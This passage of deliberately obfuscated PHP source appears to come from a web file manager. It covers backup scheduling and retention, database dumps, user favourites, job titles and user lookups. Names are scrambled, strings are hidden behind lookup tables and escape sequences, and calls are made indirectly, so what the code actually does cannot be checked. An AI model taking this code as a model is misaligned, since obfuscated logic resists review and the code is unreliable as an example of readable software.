$ƒØùğî¬ = $İª¯—Øş; break; } } $–•ü’¦ì[] = $ƒØùğî¬; $×ı”× = $Ò çç[831]; if (!$×ı”×) { die; } } $´Ø¡î‘Š = 2; for ($İª¯—Øş = $ïÂªõÅ; $İª¯—Øş > 1; $İª¯—Øş--) { $áÆ²ßµ§ = !0; $¶ìÑº‰¡ = $Ò çç[832]; while (strlen($¶ìÑº‰¡) < $Ò çç[700]) { if (!$¶ìÑº‰¡) { break; } $¶ìÑº‰¡++; } foreach ($–•ü’¦ì as $ÙÆÀï§ğ) { if ($İª¯—Øş % $ÙÆÀï§ğ == 0) { $áÆ²ßµ§ = !1; break; } } if ($áÆ²ßµ§) { $´Ø¡î‘Š = $İª¯—Øş; break; } } return $´Ø¡î‘Š; $¾è¶„éª = $Ò çç[833]; if (!$¾è¶„éª) { die; } } public function heiud1ec239f($ÈûçÌÚÃ, $Ä¬•ØÇ) { $õÇß†ô =& $_SERVER[ÌÛŒïÀ]; return call_user_func(array($õÇß†ô[8], $õÇß†ô[308]), $ÈûçÌÚÃ, $Ä¬•ØÇ); } public function cuvd88c7fe29($Áœ’¹ğ“, $ Ğë€¢œ) { $ÔÂÉÑ¢Ö =& $_SERVER[§Êá¸İ]; $ÂèóÀøÈ =& $_SERVER[ÌÛŒïÀ]; return call_user_func(array($ÂèóÀøÈ[309], $ÂèóÀøÈ[310]), $Áœ’¹ğ“, $ Ğë€¢œ); $ßİìİÖš = $ÔÂÉÑ¢Ö[834]; while ($ßİìİÖš < $ÔÂÉÑ¢Ö[700]) { if ($ßİìİÖš >= 0) { break; } $ßİìİÖš++; } } public function madc899353b8($­â·‚çŞ, $ÔèÊâ¸á) { $ÓÁæ²× =& $_SERVER[ÌÛŒïÀ]; return call_user_func(array($ÓÁæ²×[309], $ÓÁæ²×[311]), $­â·‚çŞ, $ÔèÊâ¸á); } } class Backup { protected static $name; protected static $option; protected static $manual; public function __construct() { $this->model = Model($_SERVER[§Êá¸İ][835]); $this->init(); $this->keep(); } public function init() { $¹àø“ğ =& $_SERVER[§Êá¸İ]; $this->isManual(); self::$name = date($¹àø“ğ[836]); if (!($‡û®ø§ = $this->model->lastItem())) { $‡û®ø§ = $this->initData(); } else { self::$name = $‡û®ø§[$¹àø“ğ[32]]; if ($‡û®ø§[$¹àø“ğ[837]] == $¹àø“ğ[91]) { self::$name = date($¹àø“ğ[272]); $ô«Ò¯ş— = intval(_get($‡û®ø§, $¹àø“ğ[838], 0)); if (self::$manual == 0 && $‡û®ø§[$¹àø“ğ[32]] == self::$name) { $this->model->remove($‡û®ø§[$¹àø“ğ[483]]); } $‡û®ø§ = $this->initData($ô«Ò¯ş—, $‡û®ø§[$¹àø“ğ[839]]); } else { $this->checkStore($‡û®ø§[$¹àø“ğ[839]]); } } self::$option = $‡û®ø§; } private function isManual() { $œŞÙª = _get($GLOBALS, $_SERVER[§Êá¸İ][840], 0); $œŞÙª = intval($œŞÙª); self::$manual = $œŞÙª && $œŞÙª == 1 ? 1 : 0; } private function initData($Ç°ÃÀóü = 0, $¤ò•ñŒ¬ = '') { $¡†ÏïœŒ =& $_SERVER[§Êá¸İ]; $¯„İÒ˜¤ = $this->model->config(); if ($¤ò•ñŒ¬ && $¯„İÒ˜¤[$¡†ÏïœŒ[839]] != $¤ò•ñŒ¬) { $Ç°ÃÀóü = 0; } $this->checkStore($¯„İÒ˜¤[$¡†ÏïœŒ[839]]); if (self::$manual == 1) { self::$name .= $¡†ÏïœŒ[11] . date($¡†ÏïœŒ[841]); } $Úø¨ü­ô = array($¡†ÏïœŒ[839] => $¯„İÒ˜¤[$¡†ÏïœŒ[839]], $¡†ÏïœŒ[32] => self::$name, $¡†ÏïœŒ[837] => 0, $¡†ÏïœŒ[171] => $¯„İÒ˜¤[$¡†ÏïœŒ[171]], $¡†ÏïœŒ[842] => self::$manual, $¡†ÏïœŒ[369] => array($¡†ÏïœŒ[843] => array($¡†ÏïœŒ[837] => 0), $¡†ÏïœŒ[844] => array($¡†ÏïœŒ[837] => 0, $¡†ÏïœŒ[845] => 0, $¡†ÏïœŒ[846] => 0, $¡†ÏïœŒ[33] => $¡†ÏïœŒ[12], $¡†ÏïœŒ[847] => 0, $¡†ÏïœŒ[848] => 0), $¡†ÏïœŒ[849] => array($¡†ÏïœŒ[837] => 0, $¡†ÏïœŒ[845] => 0, $¡†ÏïœŒ[846] => 0, $¡†ÏïœŒ[847] => 0, $¡†ÏïœŒ[848] => 0), $¡†ÏïœŒ[230] => array($¡†ÏïœŒ[837] => 0, $¡†ÏïœŒ[850] => 0, $¡†ÏïœŒ[851] => 0, $¡†ÏïœŒ[852] => 0, $¡†ÏïœŒ[853] => 0, $¡†ÏïœŒ[549] => $Ç°ÃÀóü, $¡†ÏïœŒ[847] => 0, $¡†ÏïœŒ[848] => 0)), $¡†ÏïœŒ[847] => time(), $¡†ÏïœŒ[848] => 0); $Áà›º­Ğ = $this->model->insert($Úø¨ü­ô); $Úø¨ü­ô[$¡†ÏïœŒ[483]] = $Áà›º­Ğ; return $Úø¨ü­ô; } private function checkStore($«„Çó•›) { $¨öà¹ÈÀ = Model($_SERVER[§Êá¸İ][854]); $ë¾é•Ô• = $¨öà¹ÈÀ->listData($«„Çó•›); $¨öà¹ÈÀ->checkConfig($ë¾é•Ô•); } public static function get() { if (!self::$option) { $œßÓ•ù = Model($_SERVER[§Êá¸İ][835]); $ú’·Ù¨¾ = $œßÓ•ù->findByName(self::$name); $œßÓ•ù->parseContent($ú’·Ù¨¾); self::$option = $ú’·Ù¨¾; } return self::$option; } public static function set($Î¼İŸí¥) { $Å€Ùëë¯ =& $_SERVER[§Êá¸İ]; $Ã´Ÿ¦Ÿ = self::get(); foreach ($Î¼İŸí¥ as $Éìï÷§ü => $ó¨›’¿³) { array_set_value($Ã´Ÿ¦Ÿ, $Éìï÷§ü, $ó¨›’¿³); } Model($Å€Ùëë¯[835])->update($Ã´Ÿ¦Ÿ[$Å€Ùëë¯[483]], $Ã´Ÿ¦Ÿ); self::$option = $Ã´Ÿ¦Ÿ; return self::$option; } public function keep() { $§Äâ¼ß =& $_SERVER[§Êá¸İ]; $‡—Òğƒ = self::get(); if (_get($‡—Òğƒ, $§Äâ¼ß[855], 0) == $§Äâ¼ß[91]) { return; } $this->backupKeep($‡—Òğƒ); self::set(array($§Äâ¼ß[855] => 1)); } private function backupKeep($ƒŒß¼ÊÍ) { $«Õ²ŸÊ =& $_SERVER[§Êá¸İ]; if (self::$manual == 1) { return; } $£‘‡›·£ = $this->model->listData(); if (empty($£‘‡›·£)) { return; } $ğÛ‘ìˆ = 0; $Ö·Ò›’Í = array(); foreach ($£‘‡›·£ as $æå¨¹óš) { if ($ğÛ‘ìˆ >= 7) { break; } $Ö·Ò›’Í[] = $æå¨¹óš[$«Õ²ŸÊ[32]]; $ğÛ‘ìˆ++; } for ($ğÛ‘ìˆ = 0; $ğÛ‘ìˆ < 12; $ğÛ‘ìˆ++) { $Ö·Ò›’Í[] = date($«Õ²ŸÊ[856], strtotime("\55{$ğÛ‘ìˆ}\x20\155\157\x6e\x74\x68\163")); } $Ö·Ò›’Í = array_unique($Ö·Ò›’Í); $¢î¡°¿ = Model($«Õ²ŸÊ[857])->get($«Õ²ŸÊ[858]); foreach ($£‘‡›·£ as $æå¨¹óš) { if (isset($æå¨¹óš[$«Õ²ŸÊ[842]]) && $æå¨¹óš[$«Õ²ŸÊ[842]] == $«Õ²ŸÊ[91]) { continue; } if (!empty($æå¨¹óš[$«Õ²ŸÊ[32]]) && in_array($æå¨¹óš[$«Õ²ŸÊ[32]], $Ö·Ò›’Í)) { continue; } $this->model->remove($æå¨¹óš[$«Õ²ŸÊ[483]]); $†·ßËæ’ = $this->backupPath($ƒŒß¼ÊÍ, $¢î¡°¿); IO::remove($†·ßËæ’, !1); } } private function backupPath($‡ª¾’øÕ, $¯½È‹°¿ = false) { $ÓÛ¶‹±Ú =& $_SERVER[§Êá¸İ]; if (!$¯½È‹°¿) { $¯½È‹°¿ = Model($ÓÛ¶‹±Ú[857])->get($ÓÛ¶‹±Ú[858]); } $³äËÈ¯á = $‡ª¾’øÕ[$ÓÛ¶‹±Ú[32]]; $Áæ–× = substr(md5($ÓÛ¶‹±Ú[859] . $¯½È‹°¿ . $³äËÈ¯á), 0, 8); return "\173\x69\x6f\x3a{$‡ª¾’øÕ[$ÓÛ¶‹±Ú[839]]}\175\x2f\x64\x61\x74\x61\x62\x61\x73\145\x2f\x62\141\143\153\x75\x70\57" . $³äËÈ¯á . $ÓÛ¶‹±Ú[11] . $Áæ–×; } public function db() { $¶úúè³¿ =& $_SERVER[§Êá¸İ]; $„ìğüóÛ = self::get(); if (_get($„ìğüóÛ, $¶úúè³¿[860], 0) == $¶úúè³¿[91]) { return !0; } $¼ĞˆŠçè = new BackupDb(); if (!$¼ĞˆŠçè->index()) { return !1; } self::set(array($¶úúè³¿[860] => 1)); return !0; } public function dbFile() { $¾Â®êá =& $_SERVER[§Êá¸İ]; $÷ß„ãåÚ = self::get(); if (_get($÷ß„ãåÚ, $¾Â®êá[861], 0) == $¾Â®êá[91]) { return !0; } $ì–Î¾¥‘ = new BackupDbFile(); if (!$ì–Î¾¥‘->index()) { return !1; } self::set(array($¾Â®êá[861] => 1)); return !0; } public function file() { $ÌëÉ”¶¶ =& $_SERVER[§Êá¸İ]; $¥Îİü = self::get(); if (_get($¥Îİü, $ÌëÉ”¶¶[862], 0) == $ÌëÉ”¶¶[91]) { return !0; } if ($¥Îİü[$ÌëÉ”¶¶[171]] == $ÌëÉ”¶¶[863]) { $«“Ûş¢“ = new BackupFile(); if (!$«“Ûş¢“->index()) { return !1; } } self::set(array($ÌëÉ”¶¶[862] => 1, $ÌëÉ”¶¶[837] => 1)); return !0; } } class BackupDb { protected static $io; protected static $name; public function __construct() { } public function index() { $âúÇ˜¤‚ =& $_SERVER[§Êá¸İ]; $œò‡Ğ‘” = Backup::get(); self::$io = $œò‡Ğ‘”[$âúÇ˜¤‚[839]]; self::$name = $œò‡Ğ‘”[$âúÇ˜¤‚[32]]; $¹”‹Ç³– = new DbManage(); $ÃÛ®ÖçÇ = $¹”‹Ç³–->dbType(); $ŠÒ›“œÆ = array($âúÇ˜¤‚[864] => $ÃÛ®ÖçÇ, $âúÇ˜¤‚[865] => time()); Backup::set($ŠÒ›“œÆ); $Í®­§™ê = $this->tmpFilesPath() . $âúÇ˜¤‚[866] . self::$name . $âúÇ˜¤‚[8]; del_dir($Í®­§™ê); mk_dir($Í®­§™ê); $Ğè½«‘ = $ÇÉ«±œÊ = 0; try { $ôø¸ã™’ = $¹”‹Ç³–->db()->getTables(); } catch (Exception $¸¡“õÖğ) { return !1; } $ôø¸ã™’ = array_diff($ôø¸ã™’, array($âúÇ˜¤‚[867], $âúÇ˜¤‚[868])); foreach ($ôø¸ã™’ as $º¤ô®ø½) { $Ğè½«‘ += $¹”‹Ç³–->model($º¤ô®ø½)->count(); } $ã±¯äÖ = new Task($âúÇ˜¤‚[869], $âúÇ˜¤‚[870], $Ğè½«‘, LNG($âúÇ˜¤‚[871]) . $âúÇ˜¤‚[872] . LNG($âúÇ˜¤‚[873])); $GLOBALS[$âúÇ˜¤‚[874]] = self::$name; foreach ($ôø¸ã™’ as $º¤ô®ø½) { $ò¡À›‘ = $Í®­§™ê . $º¤ô®ø½ . $âúÇ˜¤‚[875]; $ÌÃ‡¥ÕÕ = null; if ($º¤ô®ø½ == $âúÇ˜¤‚[876] && (!isset($œò‡Ğ‘”[$âúÇ˜¤‚[171]]) || $œò‡Ğ‘”[$âúÇ˜¤‚[171]] == $âúÇ˜¤‚[228])) { $ÌÃ‡¥ÕÕ = self::$io; } $ÇÉ«±œÊ += $¹”‹Ç³–->sqlFromDb($º¤ô®ø½, $ò¡À›‘, $ã±¯äÖ, $ÌÃ‡¥ÕÕ); } unset($GLOBALS[$âúÇ˜¤‚[874]]); $ã±¯äÖ->end(); if ($ÇÉ«±œÊ > $Ğè½«‘) { $Ğè½«‘ = $ÇÉ«±œÊ; } $ŠÒ›“œÆ = array($âúÇ˜¤‚[864] => $ÃÛ®ÖçÇ, $âúÇ˜¤‚[860] => 1, $âúÇ˜¤‚[877] => $Ğè½«‘, $âúÇ˜¤‚[878] => $ÇÉ«±œÊ, $âúÇ˜¤‚[879] => time()); Backup::set($ŠÒ›“œÆ); if ($Ğè½«‘ - $ÇÉ«±œÊ > 0) { $ß­„Ñ—Ü = $âúÇ˜¤‚[880]; if (!stristr(I18n::getType(), $âúÇ˜¤‚[881])) { $ß­„Ñ—Ü = $âúÇ˜¤‚[882]; } write_log(array($ß­„Ñ—Ü, $ŠÒ›“œÆ), $âúÇ˜¤‚[870]); return !1; } return !0; } private function tmpFilesPath() { $¤ÖŸéëˆ =& $_SERVER[§Êá¸İ]; $¨÷Ê£í¨ = TEMP_FILES; if ($GLOBALS[$¤ÖŸéëˆ[6]][$¤ÖŸéëˆ[92]][$¤ÖŸéëˆ[883]]) { $¨÷Ê£í¨ = $GLOBALS[$¤ÖŸéëˆ[6]][$¤ÖŸéëˆ[92]][$¤ÖŸéëˆ[883]]; if (!mk_dir($¨÷Ê£í¨) || !is_writable($¨÷Ê£í¨) || !IO::mkfile($¨÷Ê£í¨ . $¤ÖŸéëˆ[884])) { $¨÷Ê£í¨ = TEMP_FILES; } } return $¨÷Ê£í¨; } } goto BºâµÊÇÚò; dôƒéŸŸ: class UserFavModel extends ModelBase { protected $tableName = "\x75\x73\145\162\137\146\x61\x76"; protected function cacheFunctionAlias($›îùäÂ) { $¹õÉçŠ² =& $_SERVER[§Êá¸İ]; return array($¹õÉçŠ²[2093] => array(USER_ID, $¹õÉçŠ²[2454])); } protected function listData() { $â°ğ =& $_SERVER[§Êá¸İ]; $à¾ÍÕÇ… = array($â°ğ[1770] => USER_ID, $â°ğ[565] => 0); $ƒĞ³Š„ß = $â°ğ[2455]; $¯¹·“å£ = $this->field($ƒĞ³Š„ß)->where($à¾ÍÕÇ…)->order($â°ğ[2456])->select(); return $¯¹·“å£ ? $¯¹·“å£ : array(); } protected function resetCache() { } protected function listView() { $„‰ŒİÖ÷ =& $_SERVER[§Êá¸İ]; $¾ì”ëåÃ = $this->listData(); $’—æ ³ì = array_filter_by_field($¾ì”ëåÃ, $„‰ŒİÖ÷[33], $„‰ŒİÖ÷[498]); $Ö½ûäşè = array_to_keyvalue($’—æ ³ì, $„‰ŒİÖ÷[12], $„‰ŒİÖ÷[87]); if (!$Ö½ûäşè) { return $¾ì”ëåÃ; } $‘ÎèŒ›’ = 2000; $ûšÉú®¿ = array($„‰ŒİÖ÷[499] => array($„‰ŒİÖ÷[500], $Ö½ûäşè)); $ŞáÍìÙ© = Model($„‰ŒİÖ÷[911])->listSource($ûšÉú®¿, $‘ÎèŒ›’); $ŞáÍìÙ© = array_merge($ŞáÍìÙ©[$„‰ŒİÖ÷[86]], $ŞáÍìÙ©[$„‰ŒİÖ÷[85]]); $ŞáÍìÙ© = array_to_keyvalue($ŞáÍìÙ©, $„‰ŒİÖ÷[193]); foreach ($¾ì”ëåÃ as $Ï¦ÄçÖ => $Ğ¯úìçé) { $£ÖŒõé¶ = $ŞáÍìÙ©[$Ğ¯úìçé[$„‰ŒİÖ÷[87]]]; $£ÖŒõé¶ = $£ÖŒõé¶ ? $£ÖŒõé¶ : array(); $¾ì”ëåÃ[$Ï¦ÄçÖ] = array_merge($£ÖŒõé¶, $Ğ¯úìçé); } return $¾ì”ëåÃ; } protected function addFav($éæÅÁï›, $„Ÿó”ªŸ = '', $Ã€¾Æ© = "\163\x6f\165\x72\143\145") { $ªŸìÃ¨ =& $_SERVER[§Êá¸İ]; $ãÂóª´ = array($ªŸìÃ¨[1770] => USER_ID, $ªŸìÃ¨[565] => 0, $ªŸìÃ¨[504] => $Ã€¾Æ©, $ªŸìÃ¨[503] => $éæÅÁï›); if ($this->where($ãÂóª´)->find()) { return !1; } $ãÂóª´ = array($ªŸìÃ¨[1770] => USER_ID, $ªŸìÃ¨[565] => 0); $ùæ²åÉò = $this->where($ãÂóª´)->max($ªŸìÃ¨[2002]); if (!$ùæ²åÉò) { $ùæ²åÉò = 0; } if (!$„Ÿó”ªŸ && $Ã€¾Æ© == $ªŸìÃ¨[498]) { $ÒûÁª‹İ = Model($ªŸìÃ¨[1428])->where(array($ªŸìÃ¨[499] => $éæÅÁï›))->find(); if (!$ÒûÁª‹İ) { return !1; } $„Ÿó”ªŸ = $ÒûÁª‹İ[$ªŸìÃ¨[32]]; } $„Ÿó”ªŸ = $this->getAutoName($„Ÿó”ªŸ); $‚¸üÀ = array($ªŸìÃ¨[1770] => USER_ID, $ªŸìÃ¨[565] => 0, $ªŸìÃ¨[502] => $„Ÿó”ªŸ, $ªŸìÃ¨[503] => $éæÅÁï›, $ªŸìÃ¨[504] => $Ã€¾Æ©, $ªŸìÃ¨[1982] => $ùæ²åÉò + 1); return $this->add($‚¸üÀ); } protected function remove($’ìÀŞ¼) { $àÏà’¿ =& $_SERVER[§Êá¸İ]; $ˆÂ¥¹™† = array($àÏà’¿[1770] => USER_ID, $àÏà’¿[501] => $’ìÀŞ¼); return $this->where($ˆÂ¥¹™†)->delete(); } protected function removeByName($Ò°–´ß²) { $¯è›¡¿Ë =& $_SERVER[§Êá¸İ]; $Ÿç“’Ò = array($¯è›¡¿Ë[1770] => USER_ID, $¯è›¡¿Ë[502] => $Ò°–´ß², $¯è›¡¿Ë[565] => 0); return $this->where($Ÿç“’Ò)->delete(); } protected function rename($×şÔÓÍ×, $±‘ø¹¨Ó) { $ŸŸÀ¨Ç =& $_SERVER[§Êá¸İ]; if ($×şÔÓÍ× == $±‘ø¹¨Ó) { return !1; } $ü”•¶íÂ = $this->getAutoName($±‘ø¹¨Ó); if ($±‘ø¹¨Ó != $ü”•¶íÂ) { return !1; } $Ï¿ş×öü = array($ŸŸÀ¨Ç[1770] => USER_ID, $ŸŸÀ¨Ç[565] => 0, $ŸŸÀ¨Ç[32] => $×şÔÓÍ×); return $this->where($Ï¿ş×öü)->save(array($ŸŸÀ¨Ç[32] => $±‘ø¹¨Ó)); } protected function resetSort($®Şü³á­) { $ÇåÙÁÁõ =& $_SERVER[§Êá¸İ]; $®Şü³á­ = is_array($®Şü³á­) ? $®Şü³á­ : array(); $¡Ä’§§¹ = array($ÇåÙÁÁõ[1770] => USER_ID); for ($Å½Ø¼Ÿ = 0; $Å½Ø¼Ÿ < count($®Şü³á­); $Å½Ø¼Ÿ++) { $¡Ä’§§¹[$ÇåÙÁÁõ[501]] = $®Şü³á­[$Å½Ø¼Ÿ]; $this->where($¡Ä’§§¹)->save(array($ÇåÙÁÁõ[1982] => $Å½Ø¼Ÿ + 1)); } return !0; } protected function moveTop($ÏôÊİè¸) { $­„“Ş¨å =& $_SERVER[§Êá¸İ]; $ÂØçÚ”« = array($­„“Ş¨å[1770] => USER_ID, $­„“Ş¨å[565] => 0); $¸«ö´Éû = $this->where($ÂØçÚ”«)->where(array($­„“Ş¨å[32] => $ÏôÊİè¸))->find(); if (!$¸«ö´Éû) { return; } $ê­é¼Ù“ = $this->field($­„“Ş¨å[483])->where($ÂØçÚ”«)->order($­„“Ş¨å[2456])->select(); $ê­é¼Ù“ = array_to_keyvalue($ê­é¼Ù“, $­„“Ş¨å[12], $­„“Ş¨å[483]); $ğèŠ´ô‚ = $ê­é¼Ù“; $ê­é¼Ù“ = array_remove_value($ê­é¼Ù“, $¸«ö´Éû[$­„“Ş¨å[483]]); array_unshift($ê­é¼Ù“, $¸«ö´Éû[$­„“Ş¨å[483]]); return $this->resetSort($ê­é¼Ù“); } protected function moveBottom($æˆÀ¬–É) { $¥àÛú’· =& $_SERVER[§Êá¸İ]; $û“Õİ¶½ = array($¥àÛú’·[1770] => USER_ID, $¥àÛú’·[565] => 0); $Şç‰¡‘ = $this->where($û“Õİ¶½)->max($¥àÛú’·[2002]); $Ã’Ğ„™Ú = array($¥àÛú’·[2002] => $Şç‰¡‘ + 1); return $this->where($û“Õİ¶½)->where(array($¥àÛú’·[32] => $æˆÀ¬–É))->save($Ã’Ğ„™Ú); } private function getAutoName($ƒÅ”ë) { $ğ¢›ÄºÅ =& $_SERVER[§Êá¸İ]; $×üøşâ = array($ğ¢›ÄºÅ[1770] => USER_ID, $ğ¢›ÄºÅ[565] => 0); $ƒØ¹“…ä = $this->field($ğ¢›ÄºÅ[32])->where($×üøşâ)->select(); $ƒØ¹“…ä = array_to_keyvalue($ƒØ¹“…ä, $ğ¢›ÄºÅ[12], $ğ¢›ÄºÅ[32]); if (!$ƒØ¹“…ä || !in_array($ƒÅ”ë, $ƒØ¹“…ä)) { return $ƒÅ”ë; } for ($»Ì‹÷Ò = 0; $»Ì‹÷Ò < count($ƒØ¹“…ä); $»Ì‹÷Ò++) { if (!in_array($ƒÅ”ë . "\50{$»Ì‹÷Ò}\x29", $ƒØ¹“…ä)) { return $ƒÅ”ë . "\x28{$»Ì‹÷Ò}\51"; } } return $ƒÅ”ë . "\50{$»Ì‹÷Ò}\51"; } } class UserJobModel extends ModelBaseLight { public $optionType = "\123\171\163\x74\x65\155\x2e\x6a\x6f\x62\x4c\x69\x73\x74"; public $field = array("\156\x61\155\145", "\x64\145\x73\x63", "\x73\157\x72\164"); const JOB_KEY = "\x73\145\x6c\146\112\157\x62\x4c\x69\163\164"; public function listData($ë«ƒÖïù = false, $­›±íàñ = "\x73\x6f\162\x74", $¿…Õ¤³  = false) { return parent::listData($ë«ƒÖïù, $­›±íàñ, $¿…Õ¤³ ); } public function remove($‚×ÁÔµ) { return parent::remove($‚×ÁÔµ); } public function add($ö÷•ôà›) { $Ğ—ÍßÁ =& $_SERVER[§Êá¸İ]; if ($this->findByName($ö÷•ôà›[$Ğ—ÍßÁ[32]])) { return !1; } $ö÷•ôà›[$Ğ—ÍßÁ[2002]] = $this->getSort(); return parent::insert($ö÷•ôà›); } private function getSort() { $”ßì×ñ¤ =& $_SERVER[§Êá¸İ]; $¯Šğ¶óÈ = parent::listData(); $™˜Œˆ¡ = array_to_keyvalue($¯Šğ¶óÈ, $”ßì×ñ¤[12], $”ßì×ñ¤[2002]); return empty($™˜Œˆ¡) ? 0 : max($™˜Œˆ¡) + 1; } public function update($õ£Ñ, $É¥ŞÚÒ) { $äœïñÏ» =& $_SERVER[§Êá¸İ]; $”œ±‹á = parent::listData($õ£Ñ); $®Ãª™ëÚ = $this->findByName($É¥ŞÚÒ[$äœïñÏ»[32]]); if (!$”œ±‹á || $®Ãª™ëÚ && $®Ãª™ëÚ[$äœïñÏ»[483]] != $”œ±‹á[$äœïñÏ»[483]]) { return !1; } return parent::update($õ£Ñ, $É¥ŞÚÒ); } public function setUserJob($ì ÂôÙ , $ŠÜÔ¿´) { $ºóÇù“  =& $_SERVER[§Êá¸İ]; if (!is_array($ŠÜÔ¿´)) { $ŠÜÔ¿´ = array($ŠÜÔ¿´); } $Ëµ“¼ÌÑ = parent::listData(); $¾‹ïÒÙ™ = array_to_keyvalue($Ëµ“¼ÌÑ, $ºóÇù“ [32]); $‰ Î¤úÑ = $ºóÇù“ [454]; foreach ($ŠÜÔ¿´ as $İÜËçªÆ) { if ($¾‹ïÒÙ™[$İÜËçªÆ]) { $‰ Î¤úÑ .= $¾‹ïÒÙ™[$İÜËçªÆ][$ºóÇù“ [483]] . $ºóÇù“ [50]; } else { $¬’–âÆó = $this->add($İÜËçªÆ); $‰ Î¤úÑ .= $¬’–âÆó . $ºóÇù“ [50]; } } $‰ Î¤úÑ = rtrim($‰ Î¤úÑ, $ºóÇù“ [50]); Model($ºóÇù“ [606])->metaSet($ì ÂôÙ , self::JOB_KEY, $‰ Î¤úÑ); } public function getUserJob($Ïë¼èË) { $ƒÕ½Ö‡‹ = Model($_SERVER[§Êá¸İ][606])->metaGet($Ïë¼èË); return $this->getUserJobInfo($ƒÕ½Ö‡‹[self::JOB_KEY]); } public function getUserJobInfo($Ÿ­„Ãæ¡) { $ƒÁ‡éÅ =& $_SERVER[§Êá¸İ]; $»‘ÄĞƒÀ = explode($ƒÁ‡éÅ[50], $Ÿ­„Ãæ¡); $¢½‹–ÅÎ = parent::listData(); $¢½‹–ÅÎ = array_remove_key($¢½‹–ÅÎ, $ƒÁ‡éÅ[231]); $‡é˜è·µ = array(); foreach ($»‘ÄĞƒÀ as $ì‰›÷˜) { if (isset($¢½‹–ÅÎ[$ì‰›÷˜])) { $‡é˜è·µ[] = $¢½‹–ÅÎ[$ì‰›÷˜]; } } return $‡é˜è·µ; } } class UserModel extends ModelBase { protected $tableName = "\165\163\145\x72"; protected $tableMeta = array("\x74\x61\x62\x6c\x65\116\x61\155\x65" => "\165\x73\x65\x72\x5f\x6d\x65\164\141", "\x6d\145\164\141\x46\x69\x65\x6c\x64" => "\165\163\145\162\111\104"); protected $simpleField = "\165\163\x65\x72\111\104\x2c\x6e\x69\143\153\116\141\155\x65\x2c\x6e\x61\x6d\145\x2c\141\x76\x61\164\141\162\x2c\163\145\170\54\x73\x74\141\x74\x75\163"; const ERROR_USER_NOT_EXISTS = -1; const ERROR_USER_PASSWORD_ERROR = -2; const ERROR_USER_EXIST_NAME = -3; const ERROR_USER_EXIST_PHONE = -4; const ERROR_USER_EXIST_EMAIL = -5; const ERROR_USER_LOGIN_LOCK = -6; const ERROR_IP_NOT_ALLOW = -7; const ERROR_USER_EXIST_NICKNAME = -8; protected function cacheFunctionAlias($š¿ÙÇ¶Ş) { $…öôë© =& $_SERVER[§Êá¸İ]; $ºà‚Åóı = $…öôë©[2457]; return array($…öôë©[2060] => array($š¿ÙÇ¶Ş[0], $ºà‚Åóı), $…öôë©[2062] => array($š¿ÙÇ¶Ş[0], $ºà‚Åóı), $…öôë©[2458] => array($š¿ÙÇ¶Ş[0], $ºà‚Åóı)); } protected function getInfo($™Æ¶ÁØà, $ıØ§äãË = false) { $Æƒ­ı¡µ = $this->getInfoSimple($™Æ¶ÁØà); if (!is_array($Æƒ­ı¡µ)) { return array(); } if ($ıØ§äãË) { return $this->_getInfoApply($Æƒ­ı¡µ); } return $this->cacheFunctionGet($_SERVER[§Êá¸İ][2064], $™Æ¶ÁØà); } protected function getInfoFull($¦œÕ°«å, $É°Ô‰òÑ = false) { $çù¸Ñ† = $this->getInfoSimple($¦œÕ°«å); if (!is_array($çù¸Ñ†)) { return array(); } if ($É°Ô‰òÑ) { return $this->_getInfoApply($çù¸Ñ†, !0); } return $this->cacheFunctionGet($_SERVER[§Êá¸İ][2459], $¦œÕ°«å); } private function _getInfoApply($¢†¶¯¤—, $üû×‰› = false) { $æËñÁ‹» =& $_SERVER[§Êá¸İ]; if (!$¢†¶¯¤—) { return $¢†¶¯¤—; } $°ÛÂ…‘ = md5($æËñÁ‹»[2460] . $¢†¶¯¤—[$æËñÁ‹»[976]] . $æËñÁ‹»[2461] . $¢†¶¯¤—[$æËñÁ‹»[32]]); $¢†¶¯¤— = $this->_listDataApplyItem($¢†¶¯¤—); $ïãÒ»çİ = Model($æËñÁ‹»[1428])->metaGet($¢†¶¯¤—[$æËñÁ‹»[90]][$æËñÁ‹»[193]]); $¢†¶¯¤—[$æËñÁ‹»[2462]] = $°ÛÂ…‘; $¢†¶¯¤—[$æËñÁ‹»[90]][$æËñÁ‹»[2258]] = isset($ïãÒ»çİ[$æËñÁ‹»[2259]]) ? $ïãÒ»çİ[$æËñÁ‹»[2259]] : null; if ($üû×‰›) { $¢†¶¯¤—[$æËñÁ‹»[547]] = $this->metaGet($¢†¶¯¤—[$æËñÁ‹»[1779]]); } return $¢†¶¯¤—; } protected function getInfoSimple($°İï¥—, $éîÖ¼¹å = false) { $ëîŞÇ§× =& $_SERVER[§Êá¸İ]; if (!$°İï¥—) { return array(); } if ($éîÖ¼¹å) { $ĞÏÑ¾õ = $this->where(array($ëîŞÇ§×[1779] => intval($°İï¥—)))->find(); if (!is_array($ĞÏÑ¾õ)) { return array(); } $ĞÏÑ¾õ[$ëîŞÇ§×[2463]] = Action($ëîŞÇ§×[2464])->parseUrl($ĞÏÑ¾õ[$ëîŞÇ§×[2463]]); return $ĞÏÑ¾õ; } return $this->cacheFunctionGet($ëîŞÇ§×[2065], $°İï¥—); } protected function getInfoSimpleOuter($÷Øô³º©) { $úèî¸™¡ =& $_SERVER[§Êá¸İ]; if (!$÷Øô³º© || $÷Øô³º© == 0) { return array($úèî¸™¡[1779] => $úèî¸™¡[228], $úèî¸™¡[32] => $úèî¸™¡[176] . LNG($úèî¸™¡[2465]) . $úèî¸™¡[178], $úèî¸™¡[2463] => STATIC_PATH . $úèî¸™¡[2466]); } $Šº–¸Ø = $this->cacheFunctionGet($úèî¸™¡[2065], $÷Øô³º©); $Ã™åşøß = array_field_key($Šº–¸Ø, explode($úèî¸™¡[50], $this->simpleField)); if (!$Ã™åşøß) { return array($úèî¸™¡[1779] => $úèî¸™¡[1283], $úèî¸™¡[32] => $úèî¸™¡[176] . LNG($úèî¸™¡[2467]) . $úèî¸™¡[178], $úèî¸™¡[2463] => STATIC_PATH . $úèî¸™¡[2468]); } $Ã™åşøß[$úèî¸™¡[2463]] = Action($úèî¸™¡[2464])->parseUrl($Ã™åşøß[$úèî¸™¡[2463]]); return $Ã™åşøß; } protected function groupUser($­Ùî‰øş) { } public static function errorLang($ÊİŸÅâÄ) { $ôşĞã© =& $_SERVER[§Êá¸İ]; $ĞĞ‡¦¡ = array(self::ERROR_USER_NOT_EXISTS => $ôşĞã©[2469], self::ERROR_USER_PASSWORD_ERROR => $ôşĞã©[2470], self::ERROR_USER_EXIST_NAME => $ôşĞã©[2471], self::ERROR_USER_EXIST_PHONE => $ôşĞã©[2472], self::ERROR_USER_EXIST_EMAIL => $ôşĞã©[2473], self::ERROR_USER_LOGIN_LOCK => $ôşĞã©[2474], 